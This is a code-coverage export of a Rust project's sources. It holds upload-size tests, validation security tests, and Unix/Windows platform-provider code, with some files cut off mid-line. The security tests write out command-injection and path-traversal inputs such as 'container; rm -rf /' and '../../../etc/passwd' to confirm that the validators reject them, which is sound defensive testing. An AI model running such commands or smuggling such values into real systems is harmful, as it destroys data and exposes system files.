format_size(validation::MAX_PACKAGE_FILE_SIZE as usize)\n    );\n    println!(\n        \"  Max base64 encoded size: {}\",\n        format_size(validation::MAX_BASE64_ENCODED_SIZE)\n    );\n    println!(\n        \"  Max base64 decoded size: {}\",\n        format_size(validation::MAX_BASE64_DECODED_SIZE)\n    );\n    println!(\n        \"  Max multipart fields: {}\",\n        validation::MAX_MULTIPART_FIELDS\n    );\n    println!(\n        \"  Max metadata size: {}\",\n        format_size(validation::MAX_METADATA_SIZE)\n    );\n\n    println!(\"\\nAll tests passed! Upload limit implementation is working correctly.\");\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    /// Tests the size formatting utility function\n    #[test]\n    fn test_format_size() {\n        assert_eq!(format_size(512), \"512 B\");\n        assert_eq!(format_size(1024), \"1.0 KB\");\n        assert_eq!(format_size(1536), \"1.5 KB\");\n        assert_eq!(format_size(1024 * 1024), \"1.0 MB\");\n        assert_eq!(format_size(100 * 1024 * 1024), \"100.0 MB\");\n        assert_eq!(format_size(1024 * 1024 * 1024), \"1.0 GB\");\n    }\n\n    /// Tests that valid upload sizes are accepted\n    #[test]\n    fn test_upload_size_check_success() {\n        let max_size = 100 * 1024 * 1024; // 100MB\n        let small_upload = 50 * 1024 * 1024; // 50MB\n\n        assert!(check_upload_size(small_upload, max_size).is_ok());\n    }\n\n    /// Tests that oversized uploads are rejected\n    #[test]\n    fn test_upload_size_check_failure() {\n        let max_size = validation::MAX_UPLOAD_SIZE as usize;\n        let large_upload = max_size + 1024; // Slightly over limit\n\n        let result = check_upload_size(large_upload, max_size);\n        assert!(result.is_err());\n\n        if let Err(msg) = result {\n            assert!(msg.contains(\"exceeds\"));\n            assert!(msg.contains(\"maximum\"));\n        } else {\n            panic!(\"Expected validation error\");\n        }\n    }\n\n    /// Tests that validation constants are logically consistent\n    #[test]\n    fn test_validation_constants_consistency() {\n        //           );\n        }\n    }\n\n    /// Tests base64 validation functions\n    #[test]\n    fn test_base64_validation_functions() {\n        // Test base64 size validation\n        let small_base64 = \"SGVsbG8gV29ybGQ=\"; // \"Hello World\"\n        assert!(validation::validate_base64_size(small_base64, None, None).is_ok());\n\n        // Test base64 character validation\n        assert!(validation::validate_base64_characters(small_base64).is_ok());\n        assert!(validation::validate_base64_characters(\"invalid@characters!\").is_err());\n        assert!(validation::validate_base64_characters(\"\").is_err());\n    }\n}\n","traces":[],"covered":0,"coverable":0},{"path":["/","app","rust","vm-package-server","tests","upload_security_test.rs"],"content":"//! Upload Security Tests\n//!\n//! This module contains comprehensive security tests for the validation module.\n//! Tests verify that security functions properly prevent DoS attacks, injection\n//! attacks, and other security vulnerabilities in upload handling.\n\nuse vm_package_server::validation;\n\n#[cfg(test)]\nmod validation_security_tests {\n    use super::*;\n\n    #[test]\n    fn test_base64_size_validation_prevents_bombs() {\n        // Test normal valid base64\n        let valid_base64 = \"SGVsbG8gV29ybGQ=\"; // \"Hello World\"\n        assert!(validation::validate_base64_size(valid_base64, None, None).is_ok());\n\n        // Test oversized base64 (simulated large string)\n        let large_base64 = \"A\".repeat(validation::MAX_BASE64_ENCODED_SIZE + 1);\n        assert!(validation::validate_base64_size(\u0026large_base64, None, None).is_err());\n    }\n\n    #[test]\n    fn test_docker_name_sanitization() {\n        // Valid Docker names should pass\n        assert!(validation::sanitize_docker_name(\"valid-container\").is_ok());\n        assert!(validation::sanitize_docker_name(\"test123\").is_ok());\n\n        // Invalid Docker names should fail\n        assert!(validation::sanitize_docker_name(\"../malicious\").is_err());\n        assert!(validation::sanitize_docker_name(\"container; rm -rf /\").is_err());\n        assert!(validation::sanitize_docker_name(\"\").is_err());\n    }\n\n    #[test]\n    fn test_file_size_validation() {\n        // Valid file sizes should pass\n        assert!(validation::validate_file_size(1024, None).is_ok());\n        assert!(validation::validate_file_size(1024 * 1024, None).is_ok()); // 1MB\n\n        // Oversized files should fail\n        assert!(validation::validate_file_size(validation::MAX_UPLOAD_SIZE + 1, None).is_err());\n    }\n\n    #[test]\n    fn test_hostname_validation() {\n        // Valid hostnames should pass\n        assert!(validation::validate_hostname(\"localhost\").is_ok());\n        assert!(validation::validate_hostname(\"example.com\").is_ok());\n        assert!(validation::validate_hostname(\"sub.example.com\").is_ok());\n\n        // Invalid hostnames should fail\n        assert!(validation::validate_hostname(\"\").is_err());\n        assert!(validation::validate_hostname(\"host with spaces\").is_err());\n        assert!(validation::validate_hostname(\"host;malicious\").is_err());\n    }\n\n    #[test]\n    fn test_safe_path_validation() {\n        // Valid relative paths should pass\n        assert!(validation::validate_safe_path(\"safe/path/file.txt\").is_ok());\n        assert!(validation::validate_safe_path(\"package/version/file\").is_ok());\n\n        // Dangerous paths should fail\n        assert!(validation::validate_safe_path(\"../../../etc/passwd\").is_err());\n        assert!(validation::validate_safe_path(\"/absolute/path\").is_err());\n        assert!(validation::validate_safe_path(\"path\\0injection\").is_err());\n    }\n\n    #[test]\n    fn test_shell_arg_escaping() {\n        // Test that shell arguments are properly escaped\n        let safe_arg = validation::escape_shell_arg(\"safe-filename\");\n        // Safe filenames might not need quoting\n        assert!(!safe_arg.is_empty());\n\n        let dangerous_arg = validation::escape_shell_arg(\"file; rm -rf /\");\n        // Dangerous args should be quoted or escaped\n        assert!(dangerous_arg.contains(\"'\") || dangerous_arg.len() \u003e \"file; rm -rf /\".len());\n\n        let quote_arg = validation::escape_shell_arg(\"file'name\");\n        // Arguments with quotes should be escaped\n        assert!(quote_arg.len() \u003e= \"file'name\".len());\n    }\n\n    #[test]\n    fn test_security_constants_are_reasonable() {\n        // Validate that security constants are set to reasonable values using runtime checks\n        // These checks ensure constants maintain sensible values during development\n\n        // Check upload size is within reasonable bounds\n        let upload_size = validation::MAX_UPLOAD_SIZE;\n        let min_size = 1024 * 1024; // 1MB\n        let max_size = 1024 * 1024 * 1024; // 1GB\n\n        if upload_size \u003c= min_size {\n            panic!(\n                \"MAX_UPLOAD_SIZE ({}) must be greater than {} bytes (1MB)\",\n                upload_size, min_size\n            );\n        }\n\n        if upload_size \u003e= max_size {\n            panic!(\n                \"MAX_UPLOAD_SIZE ({}) must be less than {} bytes (1GB)\",\n                upload_size, max_size\n            );\n        }\n\n        // Check base64 size relationships\n        let encoded_size = validation::MAX_BASE64_ENCODED_SIZE;\n        let decoded_size = validation::MAX_BASE64_DECODED_SIZE;\n        let upload_size_usize: usize = upload_size.try_into().unwrap();\n\n        if encoded_size \u003c upload_size_usize {\n            panic!(\n                \"MAX_BASE64_ENCODED_SIZE ({}) must be \u003e= MAX_UPLOAD_SIZE ({})\",\n                encoded_size, upload_size_usize\n            );\n        }\n\n        if decoded_size \u003e upload_size_usize {\n            panic!(\n                \"MAX_BASE64_DECODED_SIZE ({}) must be \u003c= MAX_UPLOAD_SIZE ({})\",\n                decoded_size, upload_size_usize\n            );\n        }\n\n        // Check path depth limits\n        let path_depth = validation::MAX_PATH_DEPTH;\n        if path_depth == 0 {\n            panic!(\"MAX_PATH_DEPTH must be greater than 0, got {}\", path_depth);\n        }\n\n        if path_depth \u003e= 100 {\n            panic!(\n                \"MAX_PATH_DEPTH ({}) must be less than 100 for reasonable limits\",\n                path_depth\n            );\n        }\n    }\n}\n","traces":[],"covered":0,"coverable":0},{"path":["/","app","rust","vm-platform","examples","platform_demo.rs"],"content":"//! Demo showing the clean platform abstraction API\n\nuse vm_platform::platform;\n\nfn main() -\u003e anyhow::Result\u003c()\u003e {\n    println!(\"=== VM Platform Demo ===\");\n\n    // Get platform information\n    let current_platform = vm_platform::current();\n    println!(\"Platform: {}\", current_platform.name());\n\n    // Use convenient functions\n    println!(\"Home directory: {}\", platform::home_dir()?.display());\n    println!(\n        \"Config directory: {}\",\n        platform::user_config_dir()?.display()\n    );\n    println!(\"Bin directory: {}\", platform::user_bin_dir()?.display());\n\n    // Executable naming\n    println!(\n        \"Executable 'vm' would be named: '{}'\",\n        platform::executable_name(\"vm\")\n    );\n\n    // Shell detection\n    let shell = platform::detect_shell()?;\n    println!(\"Detected shell: {}\", shell.name());\n    if let Some(profile) = shell.profile_path() {\n        println!(\"Shell profile: {}\", profile.display());\n    }\n\n    // System information\n    println!(\"CPU cores: {}\", platform::cpu_core_count()?);\n    println!(\"Memory: {} GB\", platform::total_memory_gb()?);\n\n    // Platform-specific package paths\n    println!(\"Cargo home: {}\", current_platform.cargo_home()?.display());\n\n    if let Ok(Some(npm_dir)) = current_platform.npm_global_dir() {\n        println!(\"NPM global: {}\", npm_dir.display());\n    }\n\n latform {\n    fn name(\u0026self) -\u003e \u0026'static str {\n        \"unix\"\n    }\n\n    // === Path Operations ===\n\n    fn user_config_dir(\u0026self) -\u003e Result\u003cPathBuf\u003e {\n        self.default_user_config_dir()\n    }\n\n    fn user_data_dir(\u0026self) -\u003e Result\u003cPathBuf\u003e {\n        self.default_user_data_dir()\n    }\n\n    fn user_bin_dir(\u0026self) -\u003e Result\u003cPathBuf\u003e {\n        Ok(self.home_dir()?.join(\".local\").join(\"bin\"))\n    }\n\n    fn user_cache_dir(\u0026self) -\u003e Result\u003cPathBuf\u003e {\n        Ok(dirs::cache_dir()\n            .context(\"Could not determine user cache directory\")?\n            .join(\"vm\"))\n    }\n\n    fn home_dir(\u0026self) -\u003e Result\u003cPathBuf\u003e {\n        self.default_home_dir()\n    }\n\n    fn vm_state_dir(\u0026self) -\u003e Result\u003cPathBuf\u003e {\n        self.default_vm_state_dir()\n    }\n\n    fn global_config_path(\u0026self) -\u003e Result\u003cPathBuf\u003e {\n        self.default_global_config_path()\n    }\n\n    fn port_registry_path(\u0026self) -\u003e Result\u003cPathBuf\u003e {\n        self.default_port_registry_path()\n    }\n\n    // === Shell Operations ===\n\n    fn detect_shell(\u0026self) -\u003e Result\u003cBox\u003cdyn ShellProvider\u003e\u003e {\n        let shell = env::var(\"SHELL\").unwrap_or_default();\n\n        match shell.split('/').next_back() {\n            Some(\"bash\") =\u003e Ok(Box::new(BashShell)),\n            Some(\"zsh\") =\u003e Ok(Box::new(ZshShell)),\n            Some(\"fish\") =\u003e Ok(Box::new(FishShell)),\n            _ =\u003e {\n                // Default to bash if we can't detect\n                Ok(Box::new(BashShell))\n            }\n        }\n    }\n\n    // === Binary Operations ===\n\n    fn executable_name(\u0026self, base: \u0026str) -\u003e String {\n        base.to_string()\n    }\n\n    fn install_executable(\u0026self, source: \u0026Path, dest_dir: \u0026Path, name: \u0026str) -\u003e Result\u003c()\u003e {\n        std::fs::create_dir_all(dest_dir).context(\"Failed to create destination directory\")?;\n\n        let dest = dest_dir.join(name);\n\n        // Remove existing file/symlink if it exists\n        if dest.exists() || dest.is_symlink() {\n            std::fs::remove_file(\u0026dest).context(\"Failed to remove existing file/symlink\")?;\n        }\n\n        // Create symlink\n        std::os::unix::fs::symlink(source, \u0026dest).context(\"Failed to create symlink\")?;\n\n        Ok(())\n    }\n\n    // === Package Manager Paths ===\n\n    fn cargo_home(\u0026self) -\u003e Result\u003cPathBuf\u003e {\n        self.default_cargo_home()\n    }\n\n    fn cargo_bin_dir(\u0026self) -\u003e Result\u003cPathBuf\u003e {\n        self.default_cargo_bin_dir()\n    }\n\n    fn npm_global_dir(\u0026self) -\u003e Result\u003cOption\u003cPathBuf\u003e\u003e {\n        // Try to get npm global directory\n        if let Ok(output) = Command::new(\"npm\")\n            .args([\"config\", \"get\", \"prefix\"])\n            .output()\n        {\n            if output.status.success() {\n                let prefix_str = String::from_utf8_lossy(\u0026output.stdout);\n                let prefix = prefix_str.trim();\n                return Ok(Some(PathBuf::from(prefix).join(\"lib\").join(\"node_modules\")));\n            }\n        }\n\n        // Fallback to common locations\n        let home = self.home_dir()?;\n        let candidates = [\n            home.join(\".npm-global\").join(\"lib\").join(\"node_modules\"),\n            home.join(\".local\").join(\"lib\").join(\"node_modules\"),\n        ];\n\n        for candidate in \u0026candidates {\n            if candidate.exists() {\n                return Ok(Some(candidate.clone()));\n            }\n        }\n\n        Ok(None)\n    }\n\n    fn nvm_versions_dir(\u0026self) -\u003e Result\u003cOption\u003cPathBuf\u003e\u003e {\n        let home = self.home_dir()?;\n        let nvm_dir = home.join(\".nvm\").join(\"versions\").join(\"node\");\n\n        if nvm_dir.exists() {\n            Ok(Some(nvm_dir))\n        } else {\n            Ok(None)\n        }\n    }\n\n    fn python_site_packages(\u0026self) -\u003e Result\u003cVec\u003cPathBuf\u003e\u003e {\n        let mut paths = Vec::new();\n\n        // Try to get Python site-packages directories\n        let python_commands = [\"python3\", \"python\"];\n\n        for cmd in \u0026python_commands {\n            if let Ok(output) = Command::new(cmd)\n                .args([\n                    \"-c\",\n                    \"import site; print('\\\\n'.join(site.getsitepackages()))\",\n                ])\n                .output()\n            {\n                if output.status.success() {\n                    let output_str = String::from_utf8_lossy(\u0026output.stdout);\n                    add_unique_site_packages(\u0026output_str, \u0026mut paths);\n                    break; // Use first working Python\n                }\n            }\n        }\n\n        Ok(paths)\n    }\n\n    // === System Information ===\n\n    fn cpu_core_count(\u0026self) -\u003e Result\u003cu32\u003e {\n        // Try reading from /proc/cpuinfo first (Linux)\n        if let Ok(cpuinfo) = std::fs::read_to_string(\"/proc/cpuinfo\") {\n            let core_count = cpuinfo\n                .lines()\n                .filter(|line| line.starts_with(\"processor\"))\n                .count() as u32;\n            return Ok(core_count);\n        }\n\n        // Fallback to sysinfo\n        let mut sys = sysinfo::System::new();\n        sys.refresh_cpu();\n        Ok(sys.physical_core_count().unwrap_or(1) as u32)\n    }\n\n    fn total_memory_gb(\u0026self) -\u003e Result\u003cu64\u003e {\n        // Try reading from /proc/meminfo first (Linux)\n        if let Some(memory_gb) = parse_memory_from_proc_meminfo() {\n            return Ok(memory_gb);\n        }\n\n        // Fallback to sysinfo\n        let mut sys = sysinfo::System::new();\n        sys.refresh_memory();\n        Ok(sys.total_memory() / 1024 / 1024 / 1024)\n    }\n\n    // === Process Operations ===\n\n    fn path_separator(\u0026self) -\u003e char {\n        self.default_path_separator()\n    }\n\n    fn split_path_env(\u0026self, path: \u0026str) -\u003e Vec\u003cPathBuf\u003e {\n        self.default_split_path_env(path)\n    }\n\n    fn join_path_env(\u0026self, paths: \u0026[PathBuf]) -\u003e String {\n        self.default_join_path_env(paths)\n    }\n}\n\n/// Unix process provider\npub struct UnixProcessProvider;\n\nimpl ProcessProvider for UnixProcessProvider {\n    fn prepare_command(\u0026self, _cmd: \u0026mut Command) -\u003e Result\u003c()\u003e {\n        // No special preparation needed for Unix\n        Ok(())\n    }\n\n    fn default_shell_command(\u0026self) -\u003e (\u0026'static str, Vec\u003c\u0026'static str\u003e) {\n        (\"sh\", vec![\"-c\"])\n    }\n\n    fn command_exists(\u0026self, command: \u0026str) -\u003e bool {\n        Command::new(\"which\")\n            .arg(command)\n            .output()\n            .map(|output| output.status.success())\n            .unwrap_or(false)\n    }\n}\n\n/// Parse memory from /proc/meminfo, returning memory in GB\nfn parse_memory_from_proc_meminfo() -\u003e Option\u003cu64\u003e {\n    let meminfo = match std::fs::read_to_string(\"/proc/meminfo\") {\n        Ok(content) =\u003e content,\n        Err(_) =\u003e return None,\n    };\n\n    for line in meminfo.lines() {\n        if !line.starts_with(\"MemTotal:\") {\n            continue;\n        }\n\n        let mem_kb_str = match line.split_whitespace().nth(1) {\n            Some(value) =\u003e value,\n            None =\u003e continue,\n        };\n\n        let mem_kb = match mem_kb_str.parse::\u003cu64\u003e() {\n            Ok(value) =\u003e value,\n            Err(_) =\u003e continue,\n        };\n\n        return Some(mem_kb / 1024 / 1024); // Convert KB to GB\n    }\n\n    None\n}\n\n/// Helper function to add unique site packages from command output\nfn add_unique_site_packages(output_str: \u0026str, paths: \u0026mut Vec\u003cPathBuf\u003e) {\n    for path in output_str.lines() {\n        let path = PathBuf::from(path.trim());\n        if path.exists() \u0026\u0026 !paths.contains(\u0026path) {\n            paths.push(path);\n        }\n    }\n}\n","traces":[{"line":24,"address":[7865600],"length":1,"stats":{"Line":1}},{"line":25,"address":[9430171],"length":1,"stats":{"Line":1}},{"line":28,"address":[9455040],"length":1,"stats":{"Line":0}},{"line":29,"address":[9455044],"length":1,"stats":{"Line":0}},{"line":32,"address":[9455056,9455430],"length":1,"stats":{"Line":0}},{"line":33,"address":[7865688,7865753,7865816,7865779],"length":1,"stats":{"Line":0}},{"line":36,"address":[7866016,7866297],"length":1,"stats":{"Line":0}},{"line":37,"address":[7866159,7866041,7866072,7866137],"length":1,"stats":{"Line":0}},{"line":42,"address":[7866304],"length":1,"stats":{"Line":0}},{"line":46,"address":[9457504],"length":1,"stats":{"Line":1}},{"line":47,"address":[9457508],"length":1,"stats":{"Line":1}},{"line":50,"address":[7866448],"length":1,"stats":{"Line":0}},{"line":51,"address":[9457524],"length":1,"stats":{"Line":0}},{"line":54,"address":[9455888],"length":1,"stats":{"Line":0}},{"line":55,"address":[9455892],"length":1,"stats":{"Line":0}},{"line":60,"address":[7866480,7867051],"length":1,"stats":{"Line":0}},{"line":61,"address":[7866492],"length":1,"stats":{"Line":0}},{"line":63,"address":[7866653],"length":1,"stats":{"Line":0}},{"line":64,"address":[9457786],"length":1,"stats":{"Line":0}},{"line":65,"address":[9457829],"length":1,"stats":{"Line":0}},{"line":66,"address":[9456239],"length":1,"stats":{"Line":0}},{"line":76,"address":[7867072],"length":1,"stats":{"Line":0}},{"line":77,"address":[9458148],"length":1,"stats":{"Line":0}},{"line":80,"address":[9457583,9456528],"length":1,"stats":{"Line":0}},{"line":81,"address":[7867333,7867347,7867217],"length":1,"stats":{"Line":0}},{"line": he_dir(\u0026self) -\u003e Result\u003cPathBuf\u003e {\n        Ok(dirs::data_local_dir()\n            .context(\"Could not determine local app data directory\")?\n            .join(\"vm\")\n            .join(\"cache\"))\n    }\n\n    fn home_dir(\u0026self) -\u003e Result\u003cPathBuf\u003e {\n        self.default_home_dir()\n    }\n\n    fn vm_state_dir(\u0026self) -\u003e Result\u003cPathBuf\u003e {\n        self.default_vm_state_dir()\n    }\n\n    fn global_config_path(\u0026self) -\u003e Result\u003cPathBuf\u003e {\n        self.default_global_config_path()\n    }\n\n    fn port_registry_path(\u0026self) -\u003e Result\u003cPathBuf\u003e {\n        self.default_port_registry_path()\n    }\n\n    // === Shell Operations ===\n\n    fn detect_shell(\u0026self) -\u003e Result\u003cBox\u003cdyn ShellProvider\u003e\u003e {\n        // Check for PowerShell first (most common for developers)\n        if env::var(\"PSModulePath\").is_ok() || env::var(\"PSVERSION\").is_ok() {\n            Ok(Box::new(PowerShell))\n        } else {\n            // Fallback to CMD\n            Ok(Box::new(CmdShell))\n        }\n    }\n\n    // === Binary Operations ===\n\n    fn executable_name(\u0026self, base: \u0026str) -\u003e String {\n        if base.ends_with(\".exe\") {\n            base.to_string()\n        } else {\n            format!(\"{}.exe\", base)\n        }\n    }\n\n    fn install_executable(\u0026self, source: \u0026Path, dest_dir: \u0026Path, name: \u0026str) -\u003e Result\u003c()\u003e {\n        fs::create_dir_all(dest_dir).context(\"Failed to create destination directory\")?;\n\n        let exe_name = self.executable_name(name);\n        let dest = dest_dir.join(\u0026exe_name);\n\n        // Remove existing file if it exists\n        if dest.exists() {\n            fs::remove_file(\u0026dest).context(\"Failed to remove existing executable\")?;\n        }\n\n        // Copy the executable\n        fs::copy(source, \u0026dest).context(\"Failed to copy executable\")?;\n\n        // Create a batch file wrapper for better PATH integration\n        let bat_name = format!(\"{}.bat\", name);\n        let bat_path = dest_dir.join(bat_name);\n        let bat_content = format!(\"@echo off\\n\\\"{}\\\" %*\", dest.display());\n\n        fs::write(\u0026bat_path, bat_content).context(\"Failed to create batch wrapper\")?;\n\n        // Also create a PowerShell wrapper\n        let ps1_name = format!(\"{}.ps1\", name);\n        let ps1_path = dest_dir.join(ps1_name);\n        let ps1_content = format!(\"\u0026 \\\"{}\\\" @args\", dest.display());\n\n        fs::write(\u0026ps1_path, ps1_content).context(\"Failed to create PowerShell wrapper\")?;\n\n        Ok(())\n    }\n\n    // === Package Manager Paths ===\n\n    fn cargo_home(\u0026self) -\u003e Result\u003cPathBuf\u003e {\n        self.default_cargo_home()\n    }\n\n    fn cargo_bin_dir(\u0026self) -\u003e Result\u003cPathBuf\u003e {\n        self.default_cargo_bin_dir()\n    }\n\n    fn npm_global_dir(\u0026self) -\u003e Result\u003cOption\u003cPathBuf\u003e\u003e {\n        // Try to get npm global directory\n        if let Ok(output) = Command::new(\"npm\")\n            .args([\"config\", \"get\", \"prefix\"])\n            .output()\n        {\n            if output.status.success() {\n                let prefix_str = String::from_utf8_lossy(\u0026output.stdout);\n                let prefix = prefix_str.trim();\n                return Ok(Some(PathBuf::from(prefix).join(\"node_modules\")));\n            }\n        }\n\n        // Fallback to common Windows npm locations\n        let appdata = dirs::data_dir().context(\"Could not determine app data directory\")?;\n\n        let candidates = [\n            appdata.join(\"npm\").join(\"node_modules\"),\n            self.home_dir()?\n                .join(\"AppData\")\n                .join(\"Roaming\")\n                .join(\"npm\")\n                .join(\"node_modules\"),\n        ];\n\n        for candidate in \u0026candidates {\n            if candidate.exists() {\n                return Ok(Some(candidate.clone()));\n            }\n        }\n\n        Ok(None)\n    }\n\n    fn nvm_versions_dir(\u0026self) -\u003e Result\u003cOption\u003cPathBuf\u003e\u003e {\n        // Windows NVM typically installs to different locations\n        let candidates = [\n            env::var(\"NVM_HOME\").ok().map(PathBuf::from),\n            Some(self.home_dir()?.join(\"AppData\").join(\"Roaming\").join(\"nvm\")),\n            Some(PathBuf::from(\"C:\\\\Program Files\\\\nodejs\")),\n        ];\n\n        for candidate in candidates.into_iter().flatten() {\n            if candidate.exists() {\n                return Ok(Some(candidate));\n            }\n        }\n\n        Ok(None)\n    }\n\n    fn python_site_packages(\u0026self) -\u003e Result\u003cVec\u003cPathBuf\u003e\u003e {\n        let mut paths = Vec::new();\n\n        // Try to get Python site-packages directories\n        let python_commands = [\"python\", \"python3\", \"py\"];\n\n        for cmd in \u0026python_commands {\n            if let Ok(output) = Command::new(cmd)\n                .args([\n                    \"-c\",\n                    \"import site; print('\\\\n'.join(site.getsitepackages()))\",\n                ])\n                .output()\n            {\n                if output.status.success() {\n                    let output_str = String::from_utf8_lossy(\u0026output.stdout);\n                    for path in output_str.lines() {\n                        let path = PathBuf::from(path.trim());\n                        if path.exists() \u0026\u0026 !paths.contains(\u0026path) {\n                            paths.push(path);\n                        }\n                    }\n                    break; // Use first working Python\n                }\n            }\n        }\n\n        Ok(paths)\n    }\n\n    // === System Information ===\n\n    fn cpu_core_count(\u0026self) -\u003e Result\u003cu32\u003e {\n        let mut sys = sysinfo::System::new();\n        sys.refresh_cpu();\n        Ok(sys.physical_core_count().unwrap_or(1) as u32)\n    }\n\n    fn total_memory_gb(\u0026self) -\u003e Result\u003cu64\u003e {\n        let mut sys = sysinfo::System::new();\n        sys.refresh_memory();\n        Ok(sys.total_memory() / 1024 / 1024 / 1024)\n    }\n\n    // === Process Operations ===\n\n    fn path_separator(\u0026self) -\u003e char {\n        ';'\n    }\n\n    fn split_path_env(\u0026self, path: \u0026str) -\u003e Vec\u003cPathBuf\u003e {\n        self.default_split_path_env(path)\n    }\n\n    fn join_path_env(\u0026self, paths: \u0026[PathBuf]) -\u003e String {\n        self.default_join_path_env(paths)\n    }\n}\n\n/// Windows process provider\npub struct WindowsProcessProvider;\n\nimpl ProcessProvider for WindowsProcessProvider {\n    fn prepare_command(\u0026self, cmd: \u0026mut Command) -\u003e Result\u003c()\u003e {\n        // Set Windows-specific environment variables if needed\n        // For now, no special preparation is required\n        Ok(())\n    }\n\n    fn default_shell_command(\u0026self) -\u003e (\u0026'static str, Vec\u003c\u0026'static str\u003e) {\n        (\"cmd\", vec![\"/C\"])\n    }\n\n    fn command_exists(\u0026self, command: \u0026str) -\u003e bool {\n        Command::new(\"where\")\n            .arg(command)\n            .output()\n            .map(|output| output.status.success())\n            .unwrap_or(false)\n    }\n}\n","traces":[],"covered":0,"coverable":0},{"path":["/","app","rust","vm-platform","src","registry.rs"],"content":"//! Platform registry for detecting and providing platform implementations.\n\nuse crate::traits::PlatformProvider;\nuse std::sync::Arc;\n\n#[cfg(target_os = \"macos\")]\nuse crate::providers::MacOSPlatform;\n\n#[cfg(windows)]\nuse crate::providers::WindowsPlatform;\n\n#[cfg(unix)]\nuse crate::providers::UnixPlatform;\n\n/// Platform registry for detecting the current platform and creating providers.\npub struct PlatformRegistry;\n\nimpl PlatformRegistry {\n    /// Get the platform provider for the current operating system.\n    ///\n    /// This function automatically detects the current platform and returns\n    /// the appropriate provider implementation.\n    pub fn current() -\u003e Arc\u003cdyn PlatformProvider\u003e {\n        #[cfg(target_os = \"macos\")]\n        return Arc::new(MacOSPlatform);\n\n        #[cfg(windows)]\n        return Arc::new(WindowsPlatform);\n\n        #[cfg(all(unix, not(target_os = \"macos\")))]\n        return Arc::new(UnixPlatform);\n\n        #[cfg(not(any(unix, windows)))]\n        compile_error!(\"Unsupported platform - only Unix-like and Windows platforms are supported\");\n    }\n\n    /// Get a platform provider by name.\n    ///\n    /// This is useful for testing or when you need to work with a specific\n    /// platform provider regardless of the current OS.\n    ///\n    /// # Arguments\n    /// * `name` - Platform name (\"unix\", \"windows\", \"macos\", \"linux\", \"darwin\")\n    ///\n    /// # Returns\n    /// Some(provider) if the platform is supported, None otherwise\n    pub fn for_name(name: \u0026str) -\u003e Option\u003cArc\u003cdyn PlatformProvider\u003e\u003e {\n        match name.to_lowercase().as_str() {\n            \"unix\" | \"linux\" =\u003e {\n                #[cfg(unix)]\n                return Some(Arc::new(UnixPlatform));\n                #[cfg(not(unix))]\n                return None;\n            }\n            \"windows\" | \"win32\" =\u003e {\n                #[cfg(windows)]\n                return Some(Arc::new(WindowsPlatform));\n                #[cfg(not(windows))]\n                return None;\n            }\n            \"macos\" | \"darwin\" | \"osx\" =\u003e {\n                #[cfg(target_os = \"macos\")]\n                return Some(Arc::new(MacOSPlatform));\n                #[cfg(not(target_os = \"macos\"))]\n                return None;\n            }\n            _ =\u003e None,\n        }\n    }\n\n    /// Get the current platform name as a string.\n    ///\n    /// Returns the canonical platform name for the current OS.\n    pub fn current_platform_name() -\u003e \u0026'static str {\n        Self::current().name()\n    }\n\n    /// Check if a platform is supported by name.\n    ///\n    /// # Arguments\n    /// * `name` - Platform name to check\n    ///\n    /// # Returns\n    /// true if the platform is supported, false otherwise\n    pub fn is_platform_supported(name: \u0026str) -\u003e bool {\n        Self::for_name(name).is_some()\n    }\n\n    /// List all supported platform names.\n    ///\n    /// Returns a vector of all platform names that can be used with `for_name()`.\n    pub fn supported_platforms() -\u003e Vec\u003c\u0026'static str\u003e {\n        let mut platforms = Vec::new();\n\n        #[cfg(unix)]\n        {\n            platforms.extend_from_slice(\u0026[\"unix\", \"linux\"]);\n        }\n\n        #[cfg(windows)]\n        {\n            platforms.extend_from_slice(\u0026[\"windows\", \"win32\"]);\n        }\n\n        #[cfg(target_os = \"macos\")]\n        {\n            platforms.extend_from_slice(\u0026[\"macos\", \"darwin\", \"osx\"]);\n        }\n\n        platforms\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_current_platform() {\n        let platform = PlatformRegistry::current();\n        assert!(!platform.name().is_empty());\n    }\n\n    #[test]\n    fn test_current_platform_name() {\n        let name = PlatformRegistry::current_platform_name();\n        assert!(!name.is_empty());\n        assert!([\"unix\", \"windows\", \"macos\"].contains(\u0026name));\n    }\n\n    #[test]\n    fn test_supported_platforms() {\n        let platforms = PlatformRegistry::supported_platforms();\n        assert!(!platforms.is_empty());\n\n        // Current platform should be in the supported list\n        let current_name = PlatformRegistry::current_platform_name();\n        assert!(platforms.contains(\u0026current_name));\n    }\n\n    #[test]\n    fn test_platform_support_check() {\n        // Current platform should be supported\n        let current_name = PlatformRegistry::current_platform_name();\n        assert!(PlatformRegistry::is_platform_supported(current_name));\n\n        // Invalid platform should not be supported\n        assert!(!PlatformRegistry::is_platform_supported(\"invalid\"));\n    }\n\n    #[test]\n    fn test_for_name_current_platform() {\n        let current_name = PlatformRegistry::current_platform_name();\n        let provider = PlatformRegistry::for_name(current_name);\n        assert!(provider.is_some());\n\n        if let Some(provider) = provider {\n            assert_eq!(provider.name(), current_name);\n        }\n    }\n\n    #[test]\n    fn test_platform_basic_operations() {\n        let platform = PlatformRegistry::current();\n\n        // Test basic path operations\n        assert!(platform.home_dir().is_ok());\n        assert!(platform.user_config_dir().is_ok());\n        assert!(platform.user_bin_dir().is_ok());\n\n        // Test executable naming\n        let exe_name = platform.executable_name(\"test\");\n        assert!(!exe_name.is_empty());\n\n        // Test path operations\n        assert!(platform.path_separator() == ':' || platform.path_separator() == ';');\n    }\n}\n","traces":[{"line":23,"address":[9452784],"length":1,"stats":{"Line":1}},{"line":47,"address":[9451264,9451734],"length":1,"stats":{"Line":0}},{"line":48,"address":[9451280],"length":1,"stats":{"Line":0}},{"line":49,"address":[9451357,9451329],"length":1,"stats":{"Line":0}},{"line":55,"address":[7862043,7862071],"length":1,"stats":{"Line":0}},{"line":61,"address":[7862099,7862155,7862127],"length":1,"stats":{"Line":0}},{"line":74,"address":[9451956,9451744],"length":1,"stats":{"Line":0}},{"line":75,"address":[9451817,9451838],"length":1,"stats":{"Line":0}},{"line":85,"address":[9451968],"length":1,"stats":{"Line":0}},{"line":86,"address":[9451973],"length":1,"stats":{"Li
